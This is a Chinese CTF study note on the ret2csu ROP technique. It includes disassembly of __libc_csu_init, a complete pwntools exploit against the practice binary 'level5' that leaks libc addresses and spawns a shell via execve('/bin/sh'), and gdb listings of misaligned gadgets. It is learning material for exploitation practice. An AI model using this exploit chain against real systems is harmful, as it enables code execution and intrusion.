# 1.中级ROP和格式化字符串漏洞    
鸣谢Vancir,CTF Wiki.    

## 中级ROP   
中级ROP和基础的区别就是gadgets的不同。    
### ret2csu   
64位系统中，很难直接找到每一个寄存器的gadgets，    
这时候，可以利用x64下的__libc_csu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。   
该函数：（不同版本有区别）   
 .text:00000000004005C0 ; void _libc_csu_init(void)   
 .text:00000000004005C0                 public _libc_csu_init   
 .text:00000000004005C0 _libc_csu_init proc near               ; DATA XREF: _start+16o   
 .text:00000000004005C0                 push    r15   
 .text:00000000004005C2                 push    r14   
 .text:00000000004005C4                 mov     r15d, edi   
 .text:00000000004005C7                 push    r13   
 .text:00000000004005C9                 push    r12   
 .text:00000000004005CB                 lea     r12, _frame_dummy_init_array_entry    
 .text:00000000004005D2                 push    rbp   
 .text:00000000004005D3                 lea     rbp, _do_global_dtors_aux_fini_array_entry    
 .text:00000000004005DA                 push    rbx   
 .text:00000000004005DB                 mov     r14, rsi    
 .text:00000000004005DE                 mov     r13, rdx    
 .text:00000000004005E1                 sub     rbp, r12      
 .text:00000000004005E4                 sub     rsp, 8    
 .text:00000000004005E8                 sar     rbp, 3    
 .text:00000000004005EC                 call    _init_proc    
 .text:00000000004005F1                 test    rbp, rbp    
 .text:00000000004005F4                 jz      short loc_400616    
 .text:00000000004005F6                 xor     ebx, ebx    
 .text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]   
 .text:0000000000400600   
 .text:0000000000400600 loc_400600:                             ; CODE XREF: _libc_csu_init+54j    
 .text:0000000000400600                 mov     rdx, r13    
 .text:0000000000400603                 mov     rsi, r14    
 .text:0000000000400606                 mov     edi, r15d   
 .text:0000000000400609                 call    qword ptr [r12+rbx*8]   
 .text:000000000040060D                 add     rbx, 1    
 .text:0000000000400611                 cmp     rbx, rbp    
 .text:0000000000400614                 jnz     short loc_400600    
 .text:0000000000400616   
 .text:0000000000400616 loc_400616:                             ; CODE XREF: _libc_csu_init+34j    
 .text:0000000000400616                 add     rsp, 8    
 .text:000000000040061A                 pop     rbx   
 .text:000000000040061B                 pop     rbp   
 .text:000000000040061C                 pop     r12   
 .text:000000000040061E                 pop     r13   
 .text:0000000000400620                 pop     r14   
 .text:0000000000400622                 pop     r15   
 .text:0000000000400624                 retn    
 .text:0000000000400624 _libc_csu_init endp   
![image](https://user-images.githubusercontent.com/96966904/148021608-f9cfda7a-3730-4aa5-885f-3e4a1a985dd1.png)   
  
安全保护状态：  
![image](https://user-images.githubusercontent.com/96966904/148022128-28d8d51a-22c0-484b-b728-43931a786f7b.png)  
64位系统，nx打开。  
程序如下，有一个栈溢出（老实说，我没看出来有栈溢出。。。）  
![image](https://user-images.githubusercontent.com/96966904/148022273-499add87-711b-433e-8955-4d6034dde40a.png)  
没有system函数地址，也没有/bin/sh字符串，方法同ret2libc,即调用system函数。  
若system函数无效，可使用execve获取shell。  
![image](https://user-images.githubusercontent.com/96966904/148022857-cc773dfb-452d-4720-9f3b-2f3739bc115f.png)  
exp：  
 from pwn import *  
 from LibcSearcher import LibcSearcher  
   
 #context.log_level = 'debug'  
    
 level5 = ELF('./level5')  
 sh = process('./level5')  
  
 write_got = level5.got['write']  
 read_got = level5.got['read']  
 main_addr = level5.symbols['main']  
 bss_base = level5.bss()  
 csu_front_addr = 0x0000000000400600  
 csu_end_addr = 0x000000000040061A  
 fakeebp = 'b' * 8   
  
  
 def csu(rbx, rbp, r12, r13, r14, r15, last):  
     # pop rbx,rbp,r12,r13,r14,r15  
     # rbx should be 0,  
     # rbp should be 1,enable not to jump  
     # r12 should be the function we want to call  
     # rdi=edi=r15d  
     # rsi=r14  
     # rdx=r13  
     payload = 'a' * 0x80 + fakeebp  
     payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(  
         r13) + p64(r14) + p64(r15)  
     payload += p64(csu_front_addr)  
     payload += 'a' * 0x38  
     payload += p64(last)  
     sh.send(payload)  
     sleep(1)  
  
  
 sh.recvuntil('Hello, World\n')   
 ##RDI, RSI, RDX, RCX, R8, R9, more on the stack  
 ##write(1,write_got,8)  
 csu(0, 1, write_got, 8, write_got, 1, main_addr)  
  
 write_addr = u64(sh.recv(8))  
 libc = LibcSearcher('write', write_addr)  
 libc_base = write_addr - libc.dump('write')  
 execve_addr = libc_base + libc.dump('execve')  
 log.success('execve_addr ' + hex(execve_addr))  
 ##gdb.attach(sh)  
  
 ##read(0,bss_base,16)  
 ##read execve_addr and /bin/sh\x00  
 sh.recvuntil('Hello, World\n')  
 csu(0, 1, read_got, 16, bss_base, 0, main_addr)  
 sh.send(p64(execve_addr) + '/bin/sh\x00')  
  
 sh.recvuntil('Hello, World\n')  
 ##execve(bss_base+8)  
 csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)  
 sh.interactive()  
  
上述exp是直接往gadgets注入128字节，但有的漏洞并不能注入那么多字节。  
因此提出改进方案：  
一是提前控制TBP和RBX马，二是多次利用、  
![image](https://user-images.githubusercontent.com/96966904/148024720-5571cccb-b5b0-41cc-82c4-9a8f4ad1e7bf.png)  
  
事实上，除了上述gadgets，gcc还会编译一些其他函数  
 _init  
 _start  
 call_gmon_start  
 deregister_tm_clones  
 register_tm_clones  
 _do_global_dtors_aux  
 frame_dummy  
 _libc_csu_init  
 _libc_csu_fini  
 _fini  
   
也可以执行其他的一些、  
此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。  
所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。  
![image](https://user-images.githubusercontent.com/96966904/148031583-9e763225-7442-49f2-b4d3-1be02f7f9081.png)  
但其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。  
其中，0x000000000040061A 是正常的起始地址，可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。  
要想熟练利用这些，需要掌握汇编指令的含义。  
gef➤  x/5i 0x000000000040061A  
   0x40061a <__libc_csu_init+90>:   pop    rbx  
   0x40061b <__libc_csu_init+91>:   pop    rbp  
   0x40061c <__libc_csu_init+92>:   pop    r12  
   0x40061e <__libc_csu_init+94>:   pop    r13  
   0x400620 <__libc_csu_init+96>:   pop    r14  
gef➤  x/5i 0x000000000040061b  
   0x40061b <__libc_csu_init+91>:   pop    rbp  
   0x40061c <__libc_csu_init+92>:   pop    r12  
   0x40061e <__libc_csu_init+94>:   pop    r13  
   0x400620 <__libc_csu_init+96>:   pop    r14  
   0x400622 <__libc_csu_init+98>:   pop    r15  
gef➤  x/5i 0x000000000040061A+3  
   0x40061d <__libc_csu_init+93>:   pop    rsp  
   0x40061e <__libc_csu_init+94>:   pop    r13  
   0x400620 <__libc_csu_init+96>:   pop    r14  
   0x400622 <__libc_csu_init+98>:   pop    r15  
   0x400624 <__libc_csu_init+100>:  ret  
gef➤  x/5i 0x000000000040061e  
   0x40061e <__libc_csu_init+94>:   pop    r13  
   0x400620 <__libc_csu_init+96>:   pop    r14  
   0x400622 <__libc_csu_init+98>:   pop    r15  
   0x400624 <__libc_csu_init+100>:  ret  
   0x400625:    nop  
gef➤  x/5i 0x000000000040061f  
   0x40061f <__libc_csu_init+95>:   pop    rbp  
   0x400620 <__libc_csu_init+96>:   pop    r14  
   0x400622 <__libc_csu_init+98>:   pop    r15  
   0x400624 <__libc_csu_init+100>:  ret  
   0x400625:    nop  
gef➤  x/5i 0x0000000000400620  
   0x400620 <__libc_csu_init+96>:   pop    r14  
   0x400622 <__libc_csu_init+98>:   pop    r15  
   0x400624 <__libc_csu_init+100>:  ret  
   0x400625:    nop  
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]  
gef➤  x/5i 0x0000000000400621  
   0x400621 <__libc_csu_init+97>:   pop    rsi  
   0x400622 <__libc_csu_init+98>:   pop    r15  
   0x400624 <__libc_csu_init+100>:  ret  
   0x400625:    nop  
gef➤  x/5i 0x000000000040061A+9  
   0x400623 <__libc_csu_init+99>:   pop    rdi  
   0x400624 <__libc_csu_init+100>:  ret  
   0x400625:    nop  
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]  
   0x400630 <__libc_csu_fini>:  repz ret  
